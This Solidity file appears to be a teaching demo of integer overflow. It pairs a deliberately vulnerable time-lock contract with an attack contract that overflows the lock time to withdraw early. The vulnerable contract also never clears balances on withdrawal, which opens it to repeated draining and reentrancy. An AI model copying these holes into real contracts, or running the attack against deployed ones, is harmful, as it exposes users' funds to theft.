// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

contract OverUnderFlow{
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    uint public constant timePeriod = 7 days;

    function deposite() external payable {
        require(msg.value > 0, "Require some amount.");
        balances[msg.sender] = msg.value;
        lockTime[msg.sender] = block.timestamp + timePeriod;
    }

    function withdraw() external{
        uint bal = balances[msg.sender];
        require(bal > 0, "Noting to send.");
        require(lockTime[msg.sender] < block.timestamp, "Locked period not overed.");

        (bool send, ) = msg.sender.call{value: bal}("");
        require(send, "Amount not sent.");
    }

    function increaseTime(uint _time) external{
        lockTime[msg.sender] += _time;
    }

    function showbal() public view returns(uint bal){
        bal = balances[msg.sender];
    }
}


contract AttackContract{
    OverUnderFlow public flowContract;

    constructor(address _add){
        flowContract = OverUnderFlow(_add);
    }

    fallback() external payable{}

    function attack() external payable{
        flowContract.deposite{value: msg.value}();
        flowContract.increaseTime(type(uint).max + 1 - flowContract.lockTime(address(this)));
        flowContract.withdraw();
    }

    function showbal() public view returns(uint bal){
        bal = address(this).balance;
    }
}